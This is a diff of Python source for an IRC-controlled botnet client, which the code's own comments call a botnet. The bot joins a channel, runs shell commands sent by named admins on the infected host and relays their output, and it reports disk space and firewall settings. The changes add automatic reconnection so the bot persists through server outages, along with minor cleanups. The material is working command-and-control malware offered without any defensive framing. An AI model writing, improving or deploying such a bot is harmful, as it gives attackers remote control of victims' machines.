@@ -4,8 +4,9 @@
 #Blizzo
 
 #to do list
-#make more cross-platform instead of just for linux
+#make more cross-platform instead of just for linux - windows, mac, sun, etc.
 #handle reconnecting if server restarts or there is some connection error
+#figure out how to disconnect from server and disconnect from channel
 
 import socket
 import ftplib
@@ -46,7 +47,7 @@ def execute(cmd): #execute shell commands
 	#handling multi-line output
 	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
 	if len(lines) > 1: #if there was a new line found, return array
-		if isItLs:#doing all the directory stuff
+		if isItLs: #doing all the directory stuff
 			dirs = "dirs: "
 			files = "files: "
 			for line in lines:
@@ -56,15 +57,13 @@ def execute(cmd): #execute shell commands
 					files += "'" + line + "'   "
 			lines = [dirs.strip(), files.strip()]
 
-
-		for element in lines:#check if a line is JUST a newline
+		for element in lines: #check if a line is JUST a newline
 			if element == "":
-				lines[lines.index(element)] = "~"#replace newline with a ~
+				lines[lines.index(element)] = "~" #replace newline with a ~
 
 		return lines
 	
 	return output
-
 
 #actually sending the data
 def sendData(data): #send text back to the irc server
@@ -72,8 +71,7 @@ def sendData(data): #send text back to the irc server
 	if type(data) is list:
 		for line in data:
 			irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
-	#sending a one-liner back
-	else:
+	else: #sending a one-liner back
 		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')
 
 #All of the possible functions that the botnet is capable of
@@ -96,6 +94,7 @@ def getAge(): #send uptime
 
 def terminate(): #terminate program and send goodbye message
 	sendData("Oh no! We better find some cover.")
+	irc.close()
 	exit()
 
 def freeSpace(): #tells how much free space there is
@@ -125,7 +124,7 @@ def checkFirewall(): #reports current firewall config
 		sendData(request)
 	elif (os == "windows"):
 		sendData("idk how to windows yet boss.")
-	elif (os == "macintosh"):
+	elif (os == "darwin"):
 		sendData("idk how to mac yet boss.")
 	else:
 		sendData("unknown")
@@ -148,9 +147,10 @@ if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 	DEBUG = 1
 
 #other vars
-os = platform.system().lower()
+os = platform.system().lower() #detected os in all lowercase
 INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
 					#index two is the boolean for if the interactive shell is with this bot
+DISCONNECED = 1 	#if we are disconnected, this is true
 
 #IRC Settings
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
@@ -159,7 +159,7 @@ port = 6667
 channel = "#lobby"
 nick = generateNick(os)
 
-print "The botnick is:", nick
+print "The botnick is: '%s'" % nick
 
 #dictionary of functions
 commands = {
@@ -276,36 +276,53 @@ def parseCommand(command):
 				if nick in users or "all" in users:
 					INTERACT[1] = 1
 
+#code to connect to an IRC server
+def connectToServer(nick):
+	print "connecting to:", server
 
-#Connecting to the IRC Server
-irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-print "connecting to: "+server
-irc.connect((server, port)) #connects to the server
-irc.send("USER "+ nick +" "+ nick +" "+ nick +" :This is a fun bot!\n") #user authentication
-irc.send("NICK "+ nick +"\n") #sets nick
+	connected = 0
+	while not connected:
+		try:
+			irc.connect((server, port)) #connects to the server
+			connected = 1
+		except:
+			connected = 0
+			time.sleep(5)
 
-temp=irc.recv(1024) #get response to setting nick
-if DEBUG:
-	print "text received: '%s'" % temp
-
-counter = 2
-while "nickname already in use" in temp.lower():
-	nick = nick + "-" + str(counter)
-	if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
-		nick = generateNick(os)
-		counter = 2
+	irc.send("USER " + nick + " " + nick + " " + nick + " :This is a fun bot!\n") #user authentication
 	irc.send("NICK " + nick + "\n") #sets nick
-	temp=irc.recv(1024) #get response to setting nick
-	if DEBUG:
-		print "text received: '%s'\niteration %d" % (temp, counter)
-	counter += 1
 
-irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
-irc.send("JOIN "+ channel +"\n") #join the channel
+	temp = irc.recv(1024) #get response to setting nick
+	if DEBUG:
+		print "text received: '%s'" % temp
+
+	counter = 2
+	while "nickname already in use" in temp.lower():
+		nick = nick + "-" + str(counter)
+		if len(nick) > 9: #if nick gets too long, generate new number and reset counter; try again
+			nick = generateNick(os)
+			counter = 2
+		irc.send("NICK " + nick + "\n") #sets nick
+		temp=irc.recv(1024) #get response to setting nick
+		if DEBUG:
+			print "text received: '%s'\niteration %d" % (temp, counter)
+		counter += 1
+
+	irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
+	irc.send("JOIN " + channel + "\n") #join the channel
+
+irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
+connectToServer(nick) #connect to IRC server
 
 #infinite loop to listen for messages aka commands
 while 1:
-	text=irc.recv(1024)  #receive up to 1024 bytes
+	text = irc.recv(1024) #receive up to 1024 bytes
+	while len(text) < 1: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
+		irc.close()
+		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
+		connectToServer(nick)
+		time.sleep(5)
+		text = irc.recv(1024) #receive up to 1024 bytes
 
 	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
 	if text.find('PING') != -1: #check if 'PING' is found
